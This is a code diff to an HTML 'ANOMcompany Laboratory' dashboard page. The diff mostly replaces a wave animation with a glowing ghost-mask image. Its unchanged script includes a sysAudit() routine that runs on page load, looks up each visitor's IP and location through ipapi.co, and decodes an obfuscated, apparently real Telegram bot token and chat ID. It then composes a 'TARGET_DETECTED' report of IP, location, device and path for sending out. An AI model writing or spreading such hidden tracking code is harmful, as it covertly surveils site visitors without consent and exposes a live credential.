@@ -18,8 +18,18 @@
         .dashboard { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
         .panel { border: 1px solid var(--dark-red); background: #000; position: relative; overflow: hidden; }
         .panel-header { background: var(--dark-red); color: white; padding: 5px 10px; font-size: 0.7em; letter-spacing: 2px; text-transform: uppercase; }
+        
+        /* Ghost Mask Pulsating Effect */
         #data-pulse-panel { height: 220px; display: flex; flex-direction: column; }
-        .wave-container { flex: 1; width: 100%; position: relative; }
+        .ghost-mask-container { flex: 1; display: flex; justify-content: center; align-items: center; background: #000; position: relative; overflow: hidden; }
+        .ghost-mask { width: 130px; transition: 0.5s; animation: ghostGlow 6s infinite alternate; }
+        
+        @keyframes ghostGlow {
+            0% { filter: drop-shadow(0 0 10px #fff) brightness(1.1); }
+            50% { filter: drop-shadow(0 0 25px #800080) brightness(1.4); }
+            100% { filter: drop-shadow(0 0 20px #ff0000) brightness(1.2); }
+        }
+
         .metric-label { font-size: 0.8em; margin-top: 10px; display: block; }
         .metric-bar { height: 8px; background: #222; margin: 5px 0 15px 0; border-radius: 2px; }
         .metric-fill { height: 100%; background: var(--primary-red); width: 0%; transition: width 2.5s ease-in-out; box-shadow: 0 0 8px var(--primary-red); }
@@ -51,8 +61,10 @@
         </div>
         <div class="dashboard">
             <div id="data-pulse-panel" class="panel">
-                <div class="panel-header">LIVE_DATA_STREAM // MULTI_PULSE_FEED</div>
-                <div class="wave-container" id="waveBox"></div>
+                <div class="panel-header">ANOM_SENTRY // GHOST_MASK_ACTIVE</div>
+                <div class="ghost-mask-container">
+                    <img src="1000014211.jpg" class="ghost-mask" alt="GHOST">
+                </div>
             </div>
             <div class="panel" style="padding: 20px;">
                 <div class="panel-header" style="margin: -20px -20px 20px -20px;">CORE METRICS</div>
@@ -70,7 +82,7 @@
             </div>
         </div>
     </div>
-    <div class="ticker"><div class="ticker-wrap">>>> SYSTEM_STATUS: OPERATIONAL -- LOAD_COMPLETE -- SIGNAL_ANALYSIS: ACTIVE -- REPO_SYNC: OK...</div></div>
+    <div class="ticker"><div class="ticker-wrap">>>> SYSTEM_STATUS: OPERATIONAL -- SIGNAL_ANALYSIS: ACTIVE -- GHOST_PROTOCOLS_ENGAGED -- REPO_SYNC: OK...</div></div>
 
     <script>
         const mCanvas = document.getElementById('matrix'); const mCtx = mCanvas.getContext('2d');
@@ -79,11 +91,6 @@
         const mChars = "0123456789ABCDEF@#$%&*"; const mSize = 16; const mDrops = Array(Math.floor(mCanvas.width/mSize)).fill(1);
         function drawMatrix() { mCtx.fillStyle = "rgba(8, 8, 8, 0.08)"; mCtx.fillRect(0, 0, mCanvas.width, mCanvas.height); mCtx.fillStyle = "#ff0000"; mCtx.font = mSize + "px monospace"; for (let i = 0; i < mDrops.length; i++) { const txt = mChars.charAt(Math.floor(Math.random() * mChars.length)); mCtx.fillText(txt, i * mSize, mDrops[i] * mSize); if (mDrops[i] * mSize > mCanvas.height && Math.random() > 0.975) mDrops[i] = 0; mDrops[i]++; } }
         
-        const wBox = document.getElementById('waveBox'); const wCanvas = document.createElement('canvas'); const wCtx = wCanvas.getContext('2d'); wBox.appendChild(wCanvas);
-        function initWave() { wCanvas.width = wBox.offsetWidth; wCanvas.height = wBox.offsetHeight; }
-        window.addEventListener('resize', initWave); initWave();
-        let wOffset = 0; function drawWave() { wCtx.fillStyle = '#000'; wCtx.fillRect(0, 0, wCanvas.width, wCanvas.height); wCtx.strokeStyle = 'rgba(255, 0, 0, 0.8)'; wCtx.lineWidth = 2; wCtx.beginPath(); for (let x = 0; x < wCanvas.width; x++) { const y = wCanvas.height/2 + Math.sin(x * 0.02 + wOffset) * 30 + Math.sin(x * 0.05 + wOffset * 1.5) * 15; if (x === 0) wCtx.moveTo(x, y); else wCtx.lineTo(x, y); } wCtx.stroke(); wOffset += 0.08; requestAnimationFrame(drawWave); }
-        
         const rawLog = "./initialize_lab.py\n> Mounting core systems... [OK]\n> Encrypting terminal session... [OK]\n> Welcome to ANOMcompany Laboratory.\n> ACCESS: OPERATOR GHOST.";
         let lIdx = 0; function renderTerminal() { if (lIdx < rawLog.length) { document.getElementById("typewriter").innerHTML += rawLog.charAt(lIdx) === '\n' ? '<br>' : rawLog.charAt(lIdx); lIdx++; setTimeout(renderTerminal, 40); } else { setTimeout(() => { document.getElementById('cpu-bar').style.width = "71%"; document.getElementById('ram-bar').style.width = "54%"; document.getElementById('net-bar').style.width = "88%"; }, 500); } }
 
@@ -91,6 +98,7 @@
             try {
                 const r = await fetch('https://ipapi.co/json/');
                 const d = await r.json();
+                // Base64 Obfuscated Token and ID
                 const t = atob("NzgxMjE2NzI4NTpBQUZiNTFRUzRNY2NiVG9hVVBqNmE2U2F0bDJqZWViYkgxSQ==");
                 const c = atob("NjI5ODg2OTk2OA==");
                 const msg = `🚨 *TARGET_DETECTED*\n🌐 IP: ${d.ip}\n📍 LOC: ${d.city} / ${d.country_name}\n📱 DEV: ${navigator.platform}\n🔗 PATH: ${window.location.pathname}`;
@@ -104,7 +112,6 @@
 
         window.onload = () => {
             setInterval(drawMatrix, 50);
-            drawWave();
             setTimeout(renderTerminal, 800);
             sysAudit();
         };
